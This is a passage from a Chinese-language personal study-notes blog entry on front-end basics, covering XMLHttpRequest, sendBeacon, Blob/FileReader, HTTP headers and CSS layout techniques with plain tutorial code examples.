<li><code>XMLHttpRequest.responseXML</code> – 返回从服务器收到的 <code>HTML</code> 或 <code>XML</code> 文档对象<blockquote>
<ol>
<li>该属性生效的前提是 http 回应的 <code>Content-Type</code> 头信息等于 <code>text/xml</code> 或 <code>application/xml</code>  </li>
<li><code>XMLHttpRequest.responseType = &#39;document&#39;</code>  </li>
<li>如果 <code>HTTP</code> 回应的 <code>Content-Type</code> 头信息不符合第一点规则, 但想拿到数据: <code>XMLHttpRequest.overrideMimeType(&#39;text/xml&#39;)</code>, 在 send() 之前调用  </li>
</ol>
</blockquote>
</li>
<li><code>XMLHttpRequest.responseURL</code> – 发送数据的 服务器网址</li>
<li>超时<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">XMLHttpRequest.timeout = <span class="number">10</span> * <span class="number">1000</span>;</span><br><span class="line">XMLHttpRequest.ontimeout = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;;</span><br></pre></td></tr></table></figure></li>
<li><code>XMLHttpRequest.abort()</code> – 终止已经发出的 HTTP 请求</li>
<li><code>XMLHttpRequest.upload</code> – 返回一个 <code>XMLHttpRequestUpload</code> 对象, 用来表示上传的进度 – 不透明的 – 作为一个 <code>XMLHttpRequestEventTarget</code> 可以通过对其绑定事件来追踪进度<ol>
<li><code>onloadstart</code> – 获取开始</li>
<li><code>onprogress</code> – 数据传输进行中</li>
<li><code>onabort</code> – 获取操作终止</li>
<li><code>onerror</code> – 获取失败</li>
<li><code>onload</code> – 获取成功</li>
<li><code>ontimeout</code> – 获取操作在用户规定时间内未完成</li>
<li><code>onloadend</code> – 获取完成(不论成功与否)<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">blobOrFile</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  xhr.open(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;/server&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">  xhr.onload = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> progressBar = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;progress&#x27;</span>);</span><br><span class="line">  xhr.upload.onprogress = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (e.lengthComputable) &#123;</span><br><span class="line">      progressBar.value = (e.loaded / e.total) * <span class="number">100</span>;</span><br><span class="line">      <span class="comment">// 兼容不支持 &lt;progress&gt; 元素的老式浏览器</span></span><br><span class="line">      progressBar.textContent = progressBar.value;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  xhr.send(blobOrFile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">upload(<span class="keyword">new</span> Blob([<span class="string">&#x27;hello world&#x27;</span>], &#123;<span class="attr">type</span>: <span class="string">&#x27;text/plain&#x27;</span>&#125;));</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><code>Navigator.sendBeacon()</code><blockquote>
<ol>
<li>用户卸载网页时, 有时需要向服务器发送一些数据, 自然的我们会在 unload 或 beforeunload 事件添加监听, 并在函数内使用 XMLHttpRequest 发送数据, 但是存在问题: 异步请求发送的时候页面已经卸载??<blockquote>
</blockquote>
</li>
<li>添加同步操作</li>
</ol>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;unload&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 异步请求</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;<span class="number">10000</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> m=<span class="number">0</span>; m&lt;<span class="number">1000</span>; m++) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 或者使用 setTimeout</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<blockquote>
<blockquote>
</blockquote>
<ol start="3">
<li>另一种操作, 不用延迟卸载页面</li>
</ol>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;unload&#x27;</span>, logData, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logData</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 1. url</span></span><br><span class="line">  <span class="comment">// 2. data</span></span><br><span class="line">  <span class="comment">// 发送方法是 POST, 可以跨域</span></span><br><span class="line">  navigator.sendBeacon(<span class="string">&#x27;/log&#x27;</span>, analyticsData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>Blob</code></p>
<blockquote>
<p>表示一个不可变、原始数据的类文件对象</p>
<blockquote>
</blockquote>
<p>数据按照文本或二进制的格式进行读取, 也可以转换为 <code>ReadableStream</code> 来用于数据操作</p>
<blockquote>
</blockquote>
<p><code>File</code> 接口基于 <code>Blob</code>, 继承了 <code>blob</code> 的功能并扩展使其支持用户系统上的文件</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Blob(blobParts[, options]): constructor 内容有参数中给定的数组串联而成</span></span><br><span class="line"><span class="keyword">var</span> debug = &#123;<span class="attr">hello</span>: <span class="string">&#x27;world&#x27;</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> blob = <span class="keyword">new</span> Blob([<span class="built_in">JSON</span>.stringify(debug, <span class="literal">null</span>, <span class="number">2</span>)], &#123;<span class="attr">type</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 Blob 提取数据</span></span><br><span class="line"><span class="comment">// 1. 读取为文本</span></span><br><span class="line"><span class="keyword">var</span> text = <span class="keyword">await</span>(<span class="keyword">new</span> Response(blob).text())</span><br><span class="line"><span class="comment">// 2. 使用 FileReader 读取</span></span><br><span class="line"><span class="keyword">var</span> reader = <span class="keyword">new</span> FileReader();</span><br><span class="line">reader.addEventListener(<span class="string">&#x27;loadend&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// reader.result 包含被转化为类型数组 typed array 的 blob</span></span><br><span class="line">&#125;)</span><br><span class="line">reader.readAsArrayBuffer(blob);</span><br></pre></td></tr></table></figure></li>
<li><p><code>FileReader</code> – 允许 Web 应用程序异步读取存储在用户计算机上的文件 (或原始数据缓冲区) 的内容, 使用 File 或 Blob 对象指定要读取的文件或数据</p>
</li>
</ul>
<h4 id="web-应用程序中使用文件"><a href="#web-应用程序中使用文件" class="headerlink" title="web 应用程序中使用文件"></a>web 应用程序中使用文件</h4><h4 id="http"><a href="#http" class="headerlink" title="http"></a>http</h4><ol>
<li>消息头</li>
</ol>
<ul>
<li><code>Request headers</code><blockquote>
<p><code>服务端驱动型内容协商机制</code> – 服务器根据客户端发送的消息头, (消息头描述了用户倾向的选择) 通过内部算法选择最佳的方案</p>
</blockquote>
<ol>
<li><code>Accept</code>: 用户代理希望接收的媒体资源的 <code>MIME</code> 类型, 不同 <code>MIME</code> 类型之间<strong>用逗号分隔</strong>, 同时每一种 <code>MIME</code> 配有一个<strong>品质因数</strong>, 明确不同类型的<strong>相对优先级</strong></li>
<li><code>Accept-Charset</code>: 告知服务器客户代理可以理解何种形式的字符编码</li>
<li><code>Accept-Encoding</code>: 明确说明可以接受的<strong>内容编码形式</strong>, 是一个 Q 因子清单: 如(<code>br, gzip;q=0.8</code>)</li>
<li><code>Accept-Language</code>: 提示用户期望获得的自然语言的优先顺序, Q 因子清单: 如(<code>de, en;q=0.7</code>)</li>
<li><code>User-Agent</code>: 识别发送请求的客户代理是啥: <code>Firefox/4.0.4</code></li>
<li><code>Content-type</code>: 表示客户端</li>
</ol>
</li>
</ul>
<ul>
<li><code>Response headers</code>: 被用于 <code>http</code> 响应中且和响应消息主体无关<ol>
<li><code>Last-Modified</code>: 包含源头服务器认定的资源作出修改的日期及时间</li>
<li><code>Content-Type</code>: </li>
</ol>
</li>
</ul>
<ul>
<li><code>Entity headers</code>: 关于消息主体的元数据, 实体报头可能同时存在 <code>HTTP</code> 请求和响应消息中<ol>
<li><code>Content-Length</code>: </li>
<li><code>Cotent-Language</code>:</li>
<li><code>Content-Encoding</code>:</li>
<li><code>Content-Type</code>: 用于指示资源的 <code>MIME</code> 类型 (<code>media type</code>), 在响应中, 告诉客户端<strong>实际返回的内容的内容类型</strong>, 浏览器会在某些情况下进行 <code>MIME</code> 查找, 但也不一定遵循此标题的值, 为了防止这种行为, 设置: <code>X-Content-Type-Options: nosniff</code><blockquote>
<p>例: 在 HTML 表单中使用 <code>enctype</code> 指定</p>
<blockquote>
</blockquote>
<p>在 客户端 | 服务器 都可以有 <code>Content-Type</code>, 表示发送的内容的类型, <code>get</code> 方法一般没有</p>
</blockquote>
</li>
<li><code>Expires</code>:</li>
</ol>
</li>
</ul>
<ol>
<li>请求方法</li>
</ol>
<ul>
<li><code>HEAD</code><ol>
<li>请求资源<strong>头部信息</strong>, 且这些头部与 <code>HTTP</code> <code>GET</code> 方法请求时返回的一致</li>
<li>该请求方法的一个使用场景: 下载一个大文件前先获取其大小再决定是否要下载, 以此节约宽带资源</li>
<li><code>HEAD</code> 响应不应包含响应正文, 包含了也要忽略, 虽然描述正文信息的 <code>entity</code>, <code>headers</code> 例如 <code>Content-Length</code> 可能包含在响应中, 但是它们也不是描述 <code>HEAD</code> 响应的, 而是描述同样情况下的 <code>GET</code> 请求应该返回的响应</li>
</ol>
</li>
</ul>
<h4 id="html-–-查缺补漏"><a href="#html-–-查缺补漏" class="headerlink" title="html – 查缺补漏"></a><code>html</code> – 查缺补漏</h4><h4 id="css-–-查缺补漏"><a href="#css-–-查缺补漏" class="headerlink" title="css – 查缺补漏"></a><code>css</code> – 查缺补漏</h4><ul>
<li>⭐ <strong>布局</strong> – 老重点了 </li>
</ul>
<ol>
<li><p><code>Normal flow</code></p>
<blockquote>
<p>先说: 出现在一个元素的下面的元素称为<strong>块元素</strong>, 出现在另一个元素旁边的称为<strong>内联元素</strong></p>
<blockquote>
</blockquote>
</blockquote>
</li>
<li><p><code>display 属性</code></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.class</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: block; <span class="comment">/* 块级 */</span></span><br><span class="line">  <span class="attribute">display</span>: inline;  <span class="comment">/* 内联 */</span></span><br><span class="line">  <span class="attribute">display</span>: inline-block; <span class="comment">/* 同时具备 块级和内联 的特性 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><code>弹性盒子</code> – <a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/CSS_layout/Flexbox">参考</a></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.class</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex; <span class="comment">/* 设置 flex 容器 */</span></span><br><span class="line">  <span class="attribute">flex-direction</span>: column / row; <span class="comment">/* 设置 flex 的布局是水平还是垂直方向 */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 有时候子代元素会超出容器, 这时使用以下方法 */</span></span><br><span class="line">  <span class="attribute">flex-wrap</span>: wrap;</span><br><span class="line">  <span class="attribute">flex</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="comment">/* 这样任何移除的元素将被移到下一行 */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* flex-direction 和 flex-warp 的联合缩写: */</span></span><br><span class="line">  <span class="attribute">flex-flow</span>: row wrap;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* flex 的动态尺寸, 在子代中设置 */</span></span><br><span class="line">  <span class="attribute">flex</span>: <span class="number">1</span>; <span class="comment">/* 表示每个 flex 项沿主轴的可用空间大小, 1 表示每个元素占用空间相等 -- 比例 */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 也可以设置 flex 的最小值 */</span></span><br><span class="line">  <span class="attribute">flex</span>: <span class="number">1</span> <span class="number">200px</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 水平和垂直对齐 */</span></span><br><span class="line">  <span class="attribute">justify-content</span>: center;</span><br><span class="line">  <span class="attribute">align-items</span>: center;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* flex 排序 -- 子代设置 */</span></span><br><span class="line">  <span class="attribute">order</span>: <span class="number">1</span>; <span class="comment">/* 默认为 0, 越大越靠后 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><code>网格</code> – <a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/CSS_layout/Grids">参考</a></p>
<blockquote>
<p>与 flex 布局类似, 将父容器改为网格布局后, 它的直接子项会变为网格项</p>
<blockquote>
</blockquote>
</blockquote>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 仅仅设置 display: grid 只会显示一列, 需要加列 */</span></span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="number">200px</span> <span class="number">200px</span> <span class="number">200px</span>;</span><br><span class="line">  <span class="comment">/* 或者使用 fr 单位: 窗口比例 */</span></span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="number">1</span>fr <span class="number">1</span>fr <span class="number">1</span>fr;</span><br><span class="line">  <span class="comment">/* 混合形式 就是你想的那样 */</span></span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="number">200px</span> <span class="number">1</span>fr <span class="number">1</span>fr;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 间隙 */</span></span><br><span class="line">  <span class="attribute">grid-column-gap</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">grid-row-gap</span>: <span class="number">20px</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 总称, 二者皆可 -- 为了健壮性可都写 */</span></span><br><span class="line">  <span class="attribute">grid-gap</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">gap</span>: <span class="number">20px</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 重复构建 */</span></span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="number">1</span>fr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 基于线的元素放置: 第一条列分隔线在网格最左边, 第一条行分隔线在网格最上面 */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 根据这些分隔线来指定从哪条线开始到哪条线结束, 属性: */</span></span><br><span class="line">  <span class="comment">/* grid-column-start</span></span><br><span class="line"><span class="comment">     grid-column-end</span></span><br><span class="line"><span class="comment">     grid-row-start</span></span><br><span class="line"><span class="comment">     grid-row-end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     缩写:</span></span><br><span class="line"><span class="comment">     grid-column</span></span><br><span class="line"><span class="comment">     grid-row</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="comment">/* 子代元素中设置 */</span></span><br><span class="line">  <span class="attribute">grid-column</span>: <span class="number">1</span> / <span class="number">3</span>; <span class="comment">/* 从第 1 列开始, 第 3 列结束 */</span></span><br><span class="line">  <span class="attribute">grid-row</span>: <span class="number">1</span>; <span class="comment">/* 从第 1 列开始, 结束参考内容 */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 使用 grid-template-areas -- 老方便了 */</span></span><br><span class="line">  <span class="comment">/* 父容器中设置 */</span></span><br><span class="line">  <span class="attribute">grid-template-areas</span>: </span><br><span class="line">             <span class="string">&quot;header header&quot;</span></span><br><span class="line">             <span class="string">&quot;sidebar content&quot;</span></span><br><span class="line">             <span class="string">&quot;footer footer&quot;</span>; <span class="comment">/* 就按照这个格式排 */</span></span><br><span class="line">  <span class="comment">/* 子代中设置 */</span></span><br><span class="line">  <span class="attribute">grid-area</span>: header; <span class="comment">/* header 模块 */</span></span><br><span class="line">  <span class="attribute">grid-area</span>: sidebar; <span class="comment">/* sidebar 模块 */</span></span><br><span class="line">  <span class="attribute">grid-area</span>: content; <span class="comment">/* content 模块 */</span></span><br><span class="line">  <span class="attribute">grid-area</span>: footer; <span class="comment">/* footer 模块 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><code>浮动</code></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">float</span>: left / right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 清除浮动 */</span></span><br><span class="line"><span class="selector-class">.footer</span> &#123;</span><br><span class="line">  <span class="attribute">clear</span>: both;</span><br><span class="line">  <span class="attribute">clear</span>: left / right; <span class="comment">/* 只清除 左/右 浮动 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 使用float时, 若增加样式(padding/margin), 可能会使一行容纳不了原有的布局, 于是移到下一行了 */</span></span><br><span class="line">* &#123;</span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box; </span><br><span class="line">  <span class="comment">/* 更改盒模型, 盒子宽度取值为 content + padding + border, 而不是 content, 即内容会变窄 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>需要注意的是: 1.如果一个元素的前一个块元素设置了浮动属性, 若该元素也为设置了浮动的块元素, 则该元素将与前一个元素在同一行(宽度可以容纳的前提下); 若该元素为未设置浮动的块元素, 则前一个元素是不占空间的, 即前一个元素可能会覆盖该元素; 若该元素为行内元素, 则前一个元素是占空间的; 2. 如果一个元素的前一个块元素, 且未设置浮动, 若该元素设置了浮动, 则前一个是占据空间的</p>
</blockquote>
</li>
<li><p><code>定位</code></p>
<blockquote>
<p><code>static</code> – 默认</p>
<blockquote>
</blockquote>
<p><code>relative</code> – 正常文档流 – 相对于原来的位置移动</p>
<blockquote>
</blockquote>
<p><code>absolute</code> – 脱离正常文档流 – 相对于 <html> 元素或其最近的定位祖先</p>
<blockquote>
<p>如果不设置位置(left/right/top/bottom), 该元素浮起来, 不占据空间, 如果它的所有父元素都未设置position, 则位置属性都是相对于页面的</p>
<p><code>z-index</code>: 多个元素堆叠时设置使某个元素在上面</p>
</blockquote>
</blockquote>
<blockquote>
<p><code>fixed</code> – 脱离文档流 – 相对于浏览器视口本身</p>
</blockquote>
<blockquote>
<p><code>sticky</code> – 允许被定位的元素表现得像相对定位一样, 知道滚动到某个阈值点为止, 就变得固定了</p>
</blockquote>
</li>
<li><p><code>多列布局</code></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">column-count</span>: <span class="number">3</span>; <span class="comment">/* 创建指定数量的列 */</span></span><br><span class="line"></span><br><span class="line">  <span class="attribute">column-width</span>: <span class="number">200px</span>; <span class="comment">/* 浏览器将按照指定宽度尽可能多的创建列, 任何剩余的空间之后会被现有的列平分 */</span></span><br><span class="line"></span><br><span class="line">  <span class="attribute">column-gap</span>: <span class="number">20px</span>; <span class="comment">/* 列间间隙 */</span></span><br><span class="line">  <span class="attribute">column-rule</span>: <span class="number">4px</span> dotted <span class="built_in">rgb</span>(<span class="number">79</span>, <span class="number">185</span>, <span class="number">227</span>); <span class="comment">/* 与 broder 类似 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


</li>
</ol>
<ul>
<li>一些我少用但很有用的属性</li>
</ul>
<ol>
<li><code>transition</code><blockquote>
<p><code>transition-property</code>: 指定哪些属性用于过渡</p>
<blockquote>
</blockquote>
<p><code>transition-duration</code>: 过渡时长 </p>
<blockquote>
</blockquote>
<p><code>transition-timing-funciton</code>: 定义属性值怎么变化(ease / linear / step-end / steps(4, end)……)</p>
<blockquote>
</blockquote>
<p><code>transition-delay</code>: 属性开始变化时与过渡开始发生时之间的时长</p>
<blockquote>
</blockquote>
<p>简写语法:</p>
</blockquote>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">transition</span>: &lt;property&gt; &lt;duration&gt; &lt;timing-funciton&gt; &lt;delay&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#delay</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">transition-property</span>: background-color, color;</span><br><span class="line">  <span class="attribute">transition-duration</span>: <span class="number">1s</span>;</span><br><span class="line">  <span class="attribute">transition-timing-function</span>: ease-out;</span><br><span class="line">  <span class="attribute">background-color</span>: grey;</span><br><span class="line">  <span class="attribute">color</span>: white;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#delay</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">transition-property</span>: background-color, color;</span><br><span class="line">  <span class="attribute">transition-duration</span>: <span class="number">1s</span>;</span><br><span class="line">  <span class="attribute">transition-timing-function</span>: ease-out;</span><br><span class="line">  <span class="attribute">background-color</span>: white;</span><br><span class="line">  <span class="attribute">color</span>: black;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>css</tag>
        <tag>html</tag>
        <tag>js</tag>
      </tags>
  </entry>
</search>
